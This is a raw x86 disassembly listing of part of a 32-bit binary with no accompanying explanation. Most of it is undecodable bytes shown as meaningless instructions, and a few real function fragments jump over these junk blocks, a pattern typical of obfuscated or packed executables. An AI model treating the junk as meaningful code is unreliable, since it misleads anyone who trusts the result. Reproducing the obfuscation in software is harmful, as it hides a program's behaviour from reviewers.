  405190:	sbb    eax,0xfbab5b0a
  405195:	mov    dh,0x8e
  405197:	add    cl,BYTE PTR [edx+0x74]
  40519a:	sub    DWORD PTR ds:0x8503b545,ebp
  4051a0:	outs   dx,BYTE PTR ds:[esi]
  4051a1:	push   ds
  4051a2:	add    al,0x94
  4051a4:	mov    ch,bh
  4051a6:	aam    0xa3
  4051a8:	out    dx,eax
  4051a9:	ins    DWORD PTR es:[edi],dx
  4051aa:	(bad)
  4051ad:	and    BYTE PTR [edx],bh
  4051af:	xchg   esp,eax
  4051b0:	mov    edi,0x4a324a5a
  4051b5:	out    0x64,eax
  4051b7:	push   es
  4051b8:	repnz mov ebp,0xd4c55720
  4051be:	jmp    0x4051b7
  4051c0:	(bad)  
  4051c1:	mov    al,ds:0xd9c2f4ce
  4051c6:	inc    eax
  4051c7:	mov    ds:0x9560cabd,eax
  4051cc:	lahf   
  4051cd:	cmp    al,0x66
  4051cf:	jmp    0x60b720bf
  4051d4:	js     0x40517d
  4051d6:	mov    dh,0x30
  4051d8:	mov    dh,0xfd
  4051da:	or     al,0xa
  4051dc:	or     dh,BYTE PTR [edx+0x48]
  4051df:	jecxz  0x40517d
  4051e1:	jo     0x405179
  4051e3:	lds    edi,FWORD PTR [eax-0x36]
  4051e6:	adc    eax,0x77126ea5
  4051eb:	test   DWORD PTR [ebp+ebx*8+0xb],edx
  4051ef:	adc    eax,0x72b62311
  4051f4:	fsub   QWORD PTR [esi+0x7e1179c9]
  4051fa:	xchg   esi,eax
  4051fb:	out    0xd8,al
  4051fd:	mov    al,0x9a
  4051ff:	jg     0x4051d9
  405201:	sbb    ebx,ecx
  405203:	xor    BYTE PTR [esi],ah
  405205:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405206:	arpl   ax,cx
  405208:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405209:	inc    ebx
  40520a:	add    eax,0x10ca400f
  40520f:	call   0x84c:0xe1cd367a
  405216:	xchg   edi,eax
  405217:	push   ds
  405218:	call   0xe48f6070
  40521d:	add    ebx,DWORD PTR [eax+esi*4]
  405220:	jle    0x405251
  405222:	je     0x4051db
  405224:	cmc    
  405225:	test   eax,0x6eaa13bf
  40522a:	(bad)  
  40522b:	nop
  40522c:	pause  
  40522e:	(bad)  
  405230:	stos   DWORD PTR es:[edi],eax
  405231:	stos   DWORD PTR es:[edi],eax
  405232:	or     edi,DWORD PTR [esi-0x7b9962fe]
  405238:	dec    edx
  405239:	xchg   ebp,eax
  40523a:	ja     0x4052ac
  40523c:	ins    BYTE PTR es:[edi],dx
  40523d:	retf   0x7257
  405240:	pop    esi
  405241:	enter  0x5a54,0x21
  405245:	out    0x53,al
  405247:	shl    DWORD PTR [esi+edx*1+0x9],1
  40524b:	jge    0x405298
  40524d:	bound  edx,QWORD PTR [eax+0x7]
  405250:	push   es
  405251:	pop    eax
  405252:	sub    ebp,DWORD PTR [ecx-0x31]
  405255:	vhaddps ymm6,ymm0,YMMWORD PTR [edx]
  405259:	or     edi,edi
  40525b:	push   esp
  40525c:	aad    0x1a
  40525e:	jg     0x405239
  405260:	es sub eax,0xbfd73497
  405266:	sbb    eax,0x13d4ee34
  40526b:	cmp    ch,BYTE PTR [eax+0x16]
  40526e:	dec    eax
  40526f:	rol    DWORD PTR [edi],1
  405271:	loopne 0x4052e0
  405273:	adc    edi,DWORD PTR [edx]
  405275:	arpl   WORD PTR [edx+0x6e],dx
  405278:	fimul  DWORD PTR [ebx+0x103990a2]
  40527e:	xlat   BYTE PTR ds:[ebx]
  40527f:	adc    dl,BYTE PTR [eax+0x2f]
  405282:	fxch   st(3)
  405284:	in     eax,dx
  405285:	ja     0x4052e2
  405287:	pop    es
  405288:	add    BYTE PTR [esi+0x69ce5fa1],bl
  40528e:	cli    
  40528f:	out    dx,eax
  405290:	pop    ecx
  405291:	sbb    dh,BYTE PTR [ecx]
  405293:	xchg   edx,eax
  405294:	fild   DWORD PTR [ebx]
  405296:	js     0x4052ed
  405298:	fs hlt 
  40529a:	out    dx,al
  40529b:	icebp  
  40529c:	(bad)  
  40529d:	mov    ah,0xe2
  40529f:	and    al,0x1b
  4052a1:	dec    edx
  4052a2:	cli    
  4052a3:	sbb    DWORD PTR [ebx-0x24df063a],0xffffff89
  4052aa:	test   DWORD PTR [ecx+0x30f1b0c3],edi
  4052b0:	hlt    
  4052b1:	int    0xcd
  4052b3:	stc    
  4052b4:	xchg   ebx,eax
  4052b5:	inc    di
  4052b7:	ins    BYTE PTR es:[edi],dx
  4052b8:	pop    esp
  4052b9:	adc    esp,0xfffffff5
  4052bc:	sar    BYTE PTR [eax],cl
  4052be:	mov    DWORD PTR [edi],esi
  4052c0:	cmc    
  4052c1:	in     al,dx
  4052c2:	sbb    ebp,ebp
  4052c4:	mov    esp,ebp
  4052c6:	lds    esi,FWORD PTR [ebx+0xef2280a]
  4052cc:	cwde   
  4052cd:	retf   
  4052ce:	ret    0x338e
  4052d1:	repnz add eax,ecx
  4052d4:	add    esi,ecx
  4052d6:	imul   eax,esi
  4052d9:	jmp    0x40559d
  4052de:	mov    eax,DWORD PTR [ebp+0xc]
  4052e1:	mov    eax,DWORD PTR [eax+0x78]
  4052e4:	mov    DWORD PTR [ebp+0xc],eax
  4052e7:	mov    eax,DWORD PTR [ebp-0x4]
  4052ea:	mov    esi,DWORD PTR [ebp-0x8]
  4052ed:	xor    eax,edx
  4052ef:	xor    esi,edx
  4052f1:	add    eax,ecx
  4052f3:	jmp    0x405577
  4052f8:	shl    DWORD PTR [ebx],0xe4
  4052fb:	add    al,0xe2
  4052fd:	ret    
  4052fe:	loope  0x4052e1
  405300:	and    esp,DWORD PTR [eax+0xdc10108]
  405306:	adc    eax,0x702ac6ae
  40530b:	jo     0x4052e6
  40530d:	jle    0x40537f
  40530f:	jo     0x40536a
  405311:	into   
  405312:	test   DWORD PTR [ebx-0x5f2340e9],esi
  405318:	mov    esi,ebp
  40531a:	ins    DWORD PTR es:[edi],dx
  40531b:	push   ss
  40531c:	setne  BYTE PTR [edi-0x2b749421]
  405323:	pop    ds
  405324:	(bad)  
  405325:	cmp    al,0xea
  405327:	dec    eax
  405328:	pop    ds
  405329:	shl    esi,cl
  40532b:	mul    DWORD PTR [ebx]
  40532d:	mov    esi,DWORD PTR [ebp+0x55617d6f]
  405333:	ins    DWORD PTR es:[edi],dx
  405334:	dec    eax
  405335:	pushf  
  405336:	cmp    eax,0x7c7347c3
  40533b:	cmp    DWORD PTR ds:0x6737dae8,ecx
  405341:	pop    edi
  405342:	mov    cl,0xf1
  405344:	sbb    edx,DWORD PTR [eax]
  405346:	xor    al,0xd4
  405348:	in     eax,dx
  405349:	push   0xa31b9154
  40534e:	enter  0x8124,0xe6
  405352:	dec    esp
  405353:	jl     0x405339
  405355:	dec    esp
  405356:	mov    edx,DWORD PTR [ecx+0x31]
  405359:	and    BYTE PTR [eax-0x55],0xbd
  40535d:	std    
  40535e:	pop    DWORD PTR [eax]
  405360:	das    
  405361:	(bad)  
  405362:	adc    BYTE PTR [ebp-0x24],bh
  405365:	punpckhbw mm6,mm5
  405368:	pop    ecx
  405369:	hlt    
  40536a:	loop   0x405379
  40536c:	ret    
  40536d:	dec    ecx
  40536e:	jle    0x4053b9
  405370:	ja     0x4053ce
  405372:	inc    esi
  405373:	mov    edx,0x30af41f8
  405378:	cdq    
  405379:	push   cs
  40537a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40537b:	jb     0x4052fd
  40537d:	jne    0x40530e
  40537f:	aaa    
  405380:	push   eax
  405381:	popf   
  405382:	sbb    DWORD PTR [esi-0x53],ecx
  405385:	daa    
  405386:	ror    bh,1
  405388:	pop    es
  405389:	retf   0xc585
  40538c:	stc    
  40538d:	jae    0x4053a2
  40538f:	adc    edx,esi
  405391:	call   0xbaa0:0x9527e6e4
  405398:	rcl    DWORD PTR [ebx+0x1306255d],0x99
  40539f:	xchg   ebx,eax
  4053a0:	sub    esi,edx
  4053a2:	addr16 cmp dl,ah
  4053a5:	or     al,0xaf
  4053a7:	retf   0xe9f3
  4053aa:	(bad)  
  4053ab:	mov    edi,0x6fcfd68f
  4053b0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053b1:	cmp    al,0x12
  4053b3:	jmp    0x70037c9a
  4053b8:	jl     0x40539b
  4053ba:	adc    BYTE PTR [edi+0x5a],dl
  4053bd:	mov    ds:0x5d7a197a,eax
  4053c2:	repz mov eax,0x47a6fe75
  4053c8:	mov    DWORD PTR [esi+0x713ff1a2],esi
  4053ce:	add    al,0xea
  4053d0:	sub    bh,BYTE PTR [ecx+ebp*8]
  4053d3:	frstor [esi+0x7d]
  4053d6:	jle    0x4053d0
  4053d8:	jbe    0x4053be
  4053da:	or     DWORD PTR [ebx-0x19],eax
  4053dd:	psrlw  mm2,mm5
  4053e0:	das    
  4053e1:	or     al,0xd3
  4053e3:	adc    dl,ah
  4053e5:	ins    BYTE PTR es:[edi],dx
  4053e6:	xchg   ebx,eax
  4053e7:	pop    eax
  4053e8:	mov    cl,0x56
  4053ea:	push   eax
  4053eb:	in     al,0xa6
  4053ed:	das    
  4053ee:	mov    edi,0x32c8d18f
  4053f3:	xchg   edi,eax
  4053f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4053f5:	and    DWORD PTR [edx+0x45cc905e],edi
  4053fb:	sbb    bh,ah
  4053fd:	int3   
  4053fe:	jg     0x4053d8
  405400:	lds    ecx,FWORD PTR ds:0x9f37dbcc
  405406:	fmul   QWORD PTR [ecx]
  405408:	mov    bl,0xec
  40540a:	sub    BYTE PTR [ebx-0x17c38e68],bl
  405410:	adc    cl,dl
  405412:	pusha  
  405413:	ret    
  405414:	loop   0x40544b
  405416:	push   ss
  405417:	add    DWORD PTR [ecx+0x5d],edi
  40541a:	mov    dh,BYTE PTR [edi-0x52b56a54]
  405420:	mov    al,ds:0xb88d79f1
  405425:	out    0x3,eax
  405427:	pop    esp
  405428:	std    
  405429:	push   cs
  40542a:	arpl   si,di
  40542c:	sub    dh,BYTE PTR [ecx]
  40542e:	adc    DWORD PTR [eax+0x15],ecx
  405431:	aas    
  405432:	dec    edx
  405433:	add    ecx,ecx
  405435:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405436:	mov    al,0xa0
  405438:	daa    
  405439:	adc    al,0x67
  40543b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40543c:	sub    DWORD PTR [ebp+0x7f],0x70ce3d4
  405443:	int    0xde
  405445:	mov    cl,0x97
  405447:	jl     0x405469
  405449:	pop    eax
  40544a:	daa    
  40544b:	and    DWORD PTR [ebp-0xa],ebp
  40544e:	int3   
  40544f:	idiv   BYTE PTR [edi]
  405451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405452:	in     eax,0x65
  405454:	adc    ch,BYTE PTR [edx+0x18]
  405457:	mov    bh,0x83
  405459:	icebp  
  40545a:	xlat   BYTE PTR ds:[ebx]
  40545b:	fs push edx
  40545d:	mov    dl,BYTE PTR [edi+0x15]
  405460:	jno    0x4054d8
  405462:	sub    DWORD PTR [esi],ebp
  405464:	sbb    ch,BYTE PTR [ecx+0x51c634bc]
  40546a:	jmp    0x405457
  40546c:	ins    BYTE PTR es:[edi],dx
  40546d:	inc    ebp
  40546e:	js     0x4054b9
  405470:	cmp    ecx,DWORD PTR [edx+0x414bda2d]
  405476:	add    BYTE PTR fs:[ecx-0x1ca3e01b],dh
  40547d:	sbb    DWORD PTR [esi+eax*8],edx
  405480:	jle    0x4054df
  405482:	jb     0x4054b2
  405484:	cmp    DWORD PTR [ebp-0xc876299],ecx
  40548a:	and    ah,BYTE PTR ds:0x171af099
  405490:	mov    cl,0xb8
  405492:	(bad)  
  405493:	leave  
  405494:	loop   0x405438
  405496:	cs mov ah,0xca
  405499:	mov    edi,DWORD PTR [edx+edi*1]
  40549c:	add    DWORD PTR [eax],esp
  40549e:	test   BYTE PTR [ebx],ah
  4054a0:	sub    BYTE PTR [ecx+0xf],dh
  4054a3:	cmp    ebp,DWORD PTR ss:[edx+0x7589ffdc]
  4054aa:	sub    eax,esp
  4054ac:	push   0x22285aaa
  4054b1:	nop
  4054b2:	adc    eax,0x5436d82a
  4054b7:	xchg   ecx,eax
  4054b8:	cld    
  4054b9:	rcl    DWORD PTR [eax+0x1ec399b],1
  4054bf:	and    ecx,ebp
  4054c1:	add    BYTE PTR [esi+0x4afbe156],0xa7
  4054c8:	clc    
  4054c9:	xor    BYTE PTR [esp+edi*1-0x64],al
  4054cd:	mov    dh,0xf0
  4054cf:	fmul   st(4),st
  4054d1:	jno    0x4054d3
  4054d3:	pusha  
  4054d4:	jns    0x4054ee
  4054d6:	rol    BYTE PTR [ebp+0x603439ae],cl
  4054dc:	pop    ds
  4054dd:	mov    ch,BYTE PTR [ebx+0xd7e0310]
  4054e3:	mov    eax,0x52d4078a
  4054e8:	pop    es
  4054e9:	jecxz  0x40550b
  4054eb:	adc    al,0xaf
  4054ed:	dec    esp
  4054ee:	cmp    al,0x7f
  4054f0:	dec    esi
  4054f1:	gs loope 0x40551a
  4054f4:	lods   eax,DWORD PTR ds:[esi]
  4054f5:	les    esi,FWORD PTR ds:0x206d8254
  4054fb:	test   DWORD PTR [ebp+0x14],ebx
  4054fe:	pop    ss
  4054ff:	mov    bl,0x83
  405501:	xchg   esp,eax
  405502:	cld    
  405503:	mov    ebp,0x3181f38e
  405508:	out    0xb8,eax
  40550a:	cli    
  40550b:	mov    dh,0x3
  40550d:	push   edi
  40550e:	cmc    
  40550f:	jmp    0xe5bd583c
  405514:	(bad)  
  405515:	neg    ebp
  405517:	ins    DWORD PTR es:[edi],dx
  405518:	sub    eax,0x291ff35
  40551d:	leave  
  40551e:	ror    DWORD PTR [edx-0x14],1
  405521:	(bad)  
  405522:	jnp    0x4054ef
  405524:	rcr    edi,cl
  405526:	pop    ebx
  405527:	and    bl,ch
  405529:	scas   eax,DWORD PTR es:[edi]
  40552a:	xor    ch,BYTE PTR [ebp+ebx*4-0x17]
  40552e:	push   esp
  40552f:	mov    ah,0xbe
  405531:	add    eax,0xa4c7aa93
  405536:	xor    esi,edi
  405538:	mov    edx,DWORD PTR [ebx-0x34]
  40553b:	jns    0x405561
  40553d:	push   ebx
  40553e:	icebp  
  40553f:	pop    es
  405540:	fimul  WORD PTR [edx+0x24]
  405543:	in     al,0xfb
  405545:	into   
  405546:	xor    DWORD PTR [ecx-0x77bdf7c9],ebp
  40554c:	inc    esp
  40554d:	push   0x38
  40554f:	repz mov bh,0x3
  405552:	sub    esp,DWORD PTR [ecx]
  405554:	fwait
  405555:	inc    esi
  405556:	cli    
  405557:	mov    esi,0x541512a9
  40555c:	popf   
  40555d:	jno    0x4055c4
  40555f:	retf   
  405560:	mov    al,gs:0xc0bbaad6
  405566:	sub    BYTE PTR [edi],0x85
  405569:	jmp    0xe6878e56
  40556e:	mov    eax,0xb98e2208
  405573:	inc    ecx
  405574:	or     dl,BYTE PTR [esi]
  405576:	adc    BYTE PTR [ebx],al
  405578:	icebp  
  405579:	imul   eax,esi
  40557c:	mov    esi,DWORD PTR [ebp+0xc]
  40557f:	cmp    esi,eax
  405581:	mov    eax,DWORD PTR [ebp-0x4]
  405584:	je     0x405047
  40558a:	xor    eax,edx
  40558c:	add    eax,ecx
  40558e:	mov    ecx,DWORD PTR [ebp+0xc]
  405591:	imul   eax,ecx
  405594:	add    eax,DWORD PTR [ebp+0x8]
  405597:	mov    DWORD PTR [ebp+0xc],eax
  40559a:	mov    eax,DWORD PTR [ebp+0xc]
  40559d:	pop    esi
  40559e:	leave  
  40559f:	ret    0x8
  4055a2:	push   ebp
  4055a3:	mov    ebp,esp
  4055a5:	push   ecx
  4055a6:	mov    DWORD PTR [ebp-0x4],0xf89c853d
  4055ad:	mov    eax,DWORD PTR [ebp-0x4]
  4055b0:	mov    edx,DWORD PTR [ebp+0x10]
  4055b3:	mov    ecx,0x7510855
  4055b8:	adc    DWORD PTR ds:0x434421,0x21da
  4055c2:	xor    eax,ecx
  4055c4:	add    eax,0x32729c
  4055c9:	and    DWORD PTR ds:0x4326fc,0x2b83
  4055d3:	mov    DWORD PTR [edx],eax
  4055d5:	mov    eax,ds:0x434439
  4055da:	mov    edx,DWORD PTR ds:0x43445d
  4055e0:	sub    eax,edx
  4055e2:	xor    eax,DWORD PTR [eax+edx*1]
  4055e5:	mov    eax,DWORD PTR [ebp+0xc]
  4055e8:	dec    edx
  4055e9:	xor    eax,ecx
  4055eb:	dec    edx
  4055ec:	jmp    0x405755
  4055f1:	loope  0x4055fe
  4055f3:	xchg   edi,eax
  4055f4:	fdiv   DWORD PTR [ebp+0x64]
  4055f7:	jno    0x405602
  4055f9:	add    DWORD PTR [edi-0x74],0xc89bb484
  405600:	test   eax,0x707028af
  405605:	les    edi,FWORD PTR [edi+0x70]
  405608:	jo     0x4055a7
  40560a:	cwde   
  40560b:	iret   
  40560c:	cmps   DWORD PTR es:[esi],DWORD PTR es:[edi]
  40560e:	dec    edi
  40560f:	inc    ecx
  405610:	popa   
  405611:	pop    ebp
  405612:	cmp    al,0xc7
  405614:	in     eax,0xaa
  405616:	stos   DWORD PTR es:[edi],eax
  405617:	sbb    al,dl
  405619:	xor    bh,BYTE PTR [esi+0x35]
  40561c:	mov    dl,0x20
  40561e:	inc    esp
  40561f:	mov    ss,WORD PTR [ebx]
  405621:	mov    BYTE PTR [eax-0x40],dl
  405624:	inc    ebx
  405625:	mov    ch,0xee
  405627:	mov    ah,0xe9
  405629:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40562a:	jmp    0xb27ba0f8
  40562f:	mov    esi,0xe6e87dc1
  405634:	jmp    0xe1a8:0xa23a94c8
  40563b:	adc    edx,DWORD PTR [ebp-0x1de232f3]
  405641:	cld    
  405642:	jmp    0xc8aa:0x3ce9101d
  405649:	cwde   
  40564a:	mov    esi,0xb0c888c
  40564f:	lock push ebp
  405651:	mov    edx,0x143c1c94
  405656:	push   eax
  405657:	or     dl,ah
  405659:	add    dh,bl
  40565b:	mov    bh,0x69
  40565d:	lds    edx,FWORD PTR [ebp+0x7c]
  405660:	dec    esi
  405661:	stos   DWORD PTR es:[edi],eax
  405662:	in     al,dx
  405663:	fwait
  405664:	jo     0x4056ca
  405666:	bound  ecx,QWORD PTR [edi]
  405668:	jle    0x4056c6
  40566a:	xor    BYTE PTR [edx-0x46],bh
  40566d:	sbb    al,0x92
  40566f:	sbb    BYTE PTR [edx],0x63
  405672:	jmp    0x405632
  405674:	fisttp DWORD PTR [edx+0x6874e9d0]
  40567a:	stc    
  40567b:	fdiv   DWORD PTR [edi-0x64]
  40567e:	loopne 0x40561f
  405680:	xchg   edx,eax
  405681:	xor    al,0x1e
  405683:	iret   
  405684:	pop    edi
  405685:	dec    esp
  405686:	and    DWORD PTR [esi+0x71cdd7cc],esi
  40568c:	repnz std 
  40568e:	jns    0x40568d
  405690:	das    
  405691:	mov    ah,0xb3
  405693:	push   ebx
  405694:	mov    ebp,DWORD PTR [eax+ebx*1-0x63]
  405698:	jmp    0x6d2a:0x6d6c794
  40569f:	repnz mov ds:0x6190dd6,eax
  4056a5:	jmp    ebx
  4056a7:	ss jp  0x2d43aaa9
  4056ae:	push   eax
  4056af:	sub    dh,BYTE PTR [eax]
  4056b1:	les    ebx,FWORD PTR [edx-0x682bcc22]
  4056b7:	xor    dl,BYTE PTR [edi]
  4056b9:	cdq    
  4056ba:	shr    DWORD PTR [ebx],0x3c
  4056bd:	lods   eax,DWORD PTR ds:[esi]
  4056be:	sbb    BYTE PTR [ecx],al
  4056c0:	xchg   dl,ch
  4056c2:	fild   WORD PTR [eax]
  4056c4:	fcmovnbe st,st(0)
  4056c6:	sahf   
  4056c7:	mov    al,0xcf
  4056c9:	xchg   BYTE PTR [edx+0x56],bh
  4056cc:	push   esi
  4056cd:	fldenv [eax-0x72]
  4056d0:	leave  
  4056d1:	ss popa 
  4056d3:	cmp    esp,esi
  4056d5:	mov    dl,0xc0
  4056d7:	lock adc al,0xbd
  4056da:	cli    
  4056db:	push   es
  4056dc:	add    BYTE PTR [esi],cl
  4056de:	jecxz  0x40572a
  4056e0:	inc    esp
  4056e1:	fcomp  QWORD PTR [ebp-0xb]
  4056e4:	and    eax,0xa99ea4fe
  4056e9:	and    cl,cl
  4056eb:	xor    BYTE PTR [esi],al
  4056ed:	jge    0x405741
  4056ef:	loop   0x405752
  4056f1:	dec    ebp
  4056f2:	movq   mm0,QWORD PTR ds:0xd8ea0784
  4056f9:	jns    0x4056d6
  4056fb:	aad    0xcf
  4056fd:	dec    edx
  4056fe:	xchg   DWORD PTR [esi+0x69887742],ebx
  405704:	sbb    ch,BYTE PTR [ebp-0xa]
  405707:	ss in  al,0x98
  40570a:	jne    0x40573a
  40570c:	mov    WORD PTR [edx-0x472c170e],fs
  405712:	in     eax,0xf0
  405714:	jg     0x405713
  405716:	sahf   
  405717:	or     al,0xa8
  405719:	xor    ah,0xda
  40571c:	mov    edx,0xa0f68ab1
  405721:	mov    bh,0x6c
  405723:	outs   dx,BYTE PTR ds:[esi]
  405724:	or     eax,DWORD PTR [eax+0x7d]
  405727:	stos   DWORD PTR es:[edi],eax
  405728:	mov    WORD PTR [eax-0x14],gs
  40572b:	ja     0x40570d
  40572d:	pop    edx
  40572e:	jg     0x40575b
  405730:	adc    BYTE PTR [ecx],bh
  405732:	fistp  WORD PTR [edx+eiz*1]
  405735:	inc    ebx
  405736:	mov    eax,0xf7a1c3b
  40573b:	call   0xb7fd716
  405740:	pop    eax
  405741:	stos   BYTE PTR es:[edi],al
  405742:	dec    edx
  405743:	lock xor al,0xce
  405746:	(bad)  [ebp+0x44a8e20c]
  40574c:	xchg   esp,eax
  40574d:	mov    ds:0x4011d95,eax
  405752:	cmp    bh,bl
  405754:	mov    ebp,0x10758b56
  405759:	and    DWORD PTR ds:0x43436a,0x0
  405763:	mov    edx,DWORD PTR ds:0x43436a
  405769:	inc    edx
  40576a:	mov    DWORD PTR ds:0x43436a,edx
  405770:	cmp    DWORD PTR ds:0x43436a,0x22
  405777:	jne    0x405789
  40577d:	push   DWORD PTR [ebp-0xc]
  405780:	push   DWORD PTR [ebp-0x24]
  405783:	call   DWORD PTR ds:0x4329c2
  405789:	cmp    DWORD PTR ds:0x43436a,0x1c
  405790:	jb     0x405763
  405796:	mov    edx,0x32729c
  40579b:	adc    DWORD PTR ds:0x432dbe,0x43438a
  4057a5:	add    eax,edx
  4057a7:	mov    DWORD PTR [esi+0x4],eax
  4057aa:	movzx  eax,BYTE PTR ds:0x4326f4
  4057b1:	and    eax,DWORD PTR ds:0x43439a
  4057b7:	mov    ds:0x4326f4,eax
  4057bc:	mov    eax,DWORD PTR [ebp+0x14]
  4057bf:	mov    DWORD PTR ds:0x43437e,0x718d
  4057c9:	mov    esi,DWORD PTR [ebp+0x10]
  4057cc:	xor    DWORD PTR ds:0x432704,0x2330
  4057d6:	mov    DWORD PTR [esi+0x8],eax
  4057d9:	mov    eax,DWORD PTR [ebp+0x18]
  4057dc:	mov    esi,DWORD PTR [ebp+0x10]
  4057df:	mov    DWORD PTR [esi+0xc],eax
  4057e2:	mov    eax,DWORD PTR [ebp+0x1c]
  4057e5:	mov    esi,DWORD PTR [ebp+0x10]
  4057e8:	mov    DWORD PTR [esi+0x10],eax
  4057eb:	mov    eax,eax
  4057ed:	jmp    0x405956
  4057f2:	hlt    
  4057f3:	and    BYTE PTR [ecx],bl
  4057f5:	arpl   cx,sp
  4057f7:	jno    0x40586b
  4057f9:	scas   eax,DWORD PTR es:[edi]
  4057fa:	mov    al,ds:0x32519e0f
  4057ff:	add    ecx,DWORD PTR [esp+edi*4+0x70703773]
  405806:	les    edi,FWORD PTR [edi+0x70]
  405809:	jo     0x405800
  40580b:	sbb    al,0x5e
  40580d:	mov    WORD PTR [edi+ecx*2+0x26],ss
  405811:	fisttp QWORD PTR [esi+0x61]
  405814:	ins    BYTE PTR es:[edi],dx
  405815:	mov    eax,0xb8b47b6c
  40581a:	sbb    edx,ebx
  40581c:	mov    eax,0xe072f82c
  405821:	push   cs
  405822:	std    
  405823:	pop    edi
  405824:	push   es
  405825:	loop   0x405856
  405827:	xchg   DWORD PTR [esi],edx
  405829:	aad    0x1c
  40582b:	sub    DWORD PTR [ebp-0x28],ecx
  40582e:	xlat   BYTE PTR ds:[ebx]
  40582f:	or     eax,0xb4ec7c15
  405834:	(bad)  
  405836:	cli    
  405837:	xchg   esp,eax
  405838:	sbb    eax,0x5b91b51f
  40583d:	aad    0x7d
  40583f:	mov    cl,0xa4
  405841:	retf   
  405842:	mov    DWORD PTR [ecx],esi
  405844:	lahf   
  405845:	dec    ebx
  405846:	add    ebp,DWORD PTR [ebp+0x54]
  405849:	int3   
  40584a:	adc    esi,DWORD PTR [eax-0x2830b563]
  405850:	out    dx,eax
  405851:	add    eax,0xf0876eae
  405856:	cs loopne 0x40581d
  405859:	lds    ebp,FWORD PTR [ecx]
  40585b:	and    eax,0x48b8b907
  405860:	dec    eax
  405861:	or     esp,DWORD PTR [ecx+0x23]
  405864:	ret    
  405865:	test   cl,ah
  405867:	(bad)  
  405868:	lahf   
  405869:	adc    ch,BYTE PTR [edx]
  40586b:	es adc eax,0x2adfe28
  405871:	pop    edx
  405872:	jno    0x405882
  405874:	bound  edi,QWORD PTR [edi-0x1ea4a996]
  40587a:	mov    al,ds:0x9b5eb102
  40587f:	adc    eax,ebp
  405881:	push   esi
  405882:	fmul   st,st(3)
  405884:	sub    al,0xd6
  405886:	xor    al,0x1c
  405888:	jecxz  0x4058d7
  40588a:	loopne 0x4058eb
  40588c:	daa    
  40588d:	fwait
  40588e:	arpl   WORD PTR [ecx-0x3ddb8282],di
  405894:	and    edi,0x5d
  405897:	cdq    
  405898:	adc    eax,0xba16d638
  40589d:	rol    ecx,cl
  40589f:	in     al,dx
  4058a0:	xchg   edi,eax
  4058a1:	jmp    0x9634a709
  4058a6:	push   0xd458231d
  4058ab:	lahf   
  4058ac:	pop    ss
  4058ad:	(bad)  
  4058ae:	sbb    BYTE PTR ds:0x1886e0bf,0xd5
  4058b5:	mov    ah,0xc9
  4058b7:	das    
  4058b8:	ds out 0xbd,eax
  4058bb:	repz xchg ebx,eax
  4058bd:	das    
  4058be:	leave  
  4058bf:	scas   eax,DWORD PTR es:[edi]
  4058c0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4058c1:	pop    edi
  4058c2:	(bad)  
  4058c3:	enter  0xf714,0x2
  4058c7:	std    
  4058c8:	pop    ebx
  4058c9:	mov    ch,0xa3
  4058cb:	push   edx
  4058cc:	aaa    
  4058cd:	adc    dl,BYTE PTR ds:0xfc292e31
  4058d3:	outs   dx,BYTE PTR ds:[esi]
  4058d4:	outs   dx,BYTE PTR ds:[esi]
  4058d5:	push   ss
  4058d6:	imul   esi
  4058d8:	cs xor eax,0x9a31907c
  4058de:	out    0xbe,al
  4058e0:	sbb    DWORD PTR [eax+0x299b2989],ebp
  4058e6:	mov    bh,0xb2
  4058e8:	pop    ss
  4058e9:	jnp    0x405912
  4058eb:	sbb    al,BYTE PTR [edi]
  4058ed:	test   DWORD PTR [ebp+0x39],edi
  4058f0:	inc    ebx
  4058f1:	addr16 xor eax,0x422bac07
  4058f7:	or     edi,edi
  4058f9:	xor    DWORD PTR [edx],ecx
  4058fb:	mul    bl
  4058fd:	ins    BYTE PTR es:[edi],dx
  4058fe:	imul   eax,DWORD PTR [eax-0x47],0x30
  405902:	(bad)  
  405903:	mov    cl,0x7b
  405905:	push   ebp
  405906:	les    eax,FWORD PTR ds:0xbbef5d29
  40590c:	sbb    al,cl
  40590e:	mov    ecx,0x2b7a6cf1
  405913:	rol    DWORD PTR fs:[esi-0x2e0c3220],1
  40591a:	add    BYTE PTR [edx+0x24c79928],al
  405920:	lds    esi,FWORD PTR [edx-0xd5fd15f]
  405926:	(bad)  
  405927:	and    BYTE PTR ds:0x9c82cd62,bh
  40592d:	fsincos 
  40592f:	cmp    ebx,DWORD PTR [edx+0x50d17cba]
  405935:	push   ebx
  405936:	out    0x9d,al
  405938:	push   ecx
  405939:	jno    0x405960
  40593b:	stos   BYTE PTR es:[edi],al
  40593c:	ins    BYTE PTR es:[edi],dx
  40593d:	lods   eax,DWORD PTR ds:[esi]
  40593e:	addr16 jge 0x4059ba
  405941:	repnz nop
  405943:	das    
  405944:	std    
  405945:	out    0xd7,eax
  405947:	pusha  
  405948:	push   0x3
  40594a:	mov    ah,0x3e
  40594c:	mov    DWORD PTR ds:0x33a178e2,edi
  405952:	jmp    0x40596d
  405954:	fstp   DWORD PTR [ebx+ecx*4-0x3eccf7bb]
  40595b:	add    eax,edx
  40595d:	pop    esi
  40595e:	leave  
  40595f:	ret    0x18
  405962:	push   ebp
  405963:	mov    ebp,esp
  405965:	mov    eax,DWORD PTR [ebp+0xc]
  405968:	xor    edx,edx
  40596a:	jmp    0x405ad3
  40596f:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  405971:	sub    esi,DWORD PTR [esi+0x7161b2eb]
  405977:	mov    ah,0xc8
  405979:	mov    esi,0x6828e911
  40597e:	xchg   ebx,eax
  40597f:	(bad)  
  405980:	xor    eax,0x7fc47070
  405985:	jo     0x4059f7
  405987:	push   ss
  405988:	out    0xf0,al
  40598a:	sub    bl,BYTE PTR [esi]
  40598c:	ja     0x40598b
  40598e:	add    edi,DWORD PTR [ecx+0x18]
  405991:	and    edx,DWORD PTR [edx]
  405993:	pop    es
  405994:	sbb    al,0xe7
  405996:	out    0x3,eax
  405998:	arpl   WORD PTR [edi+0xf8a2853],bp
  40599e:	pop    ds
  40599f:	cwde   
  4059a0:	push   edi
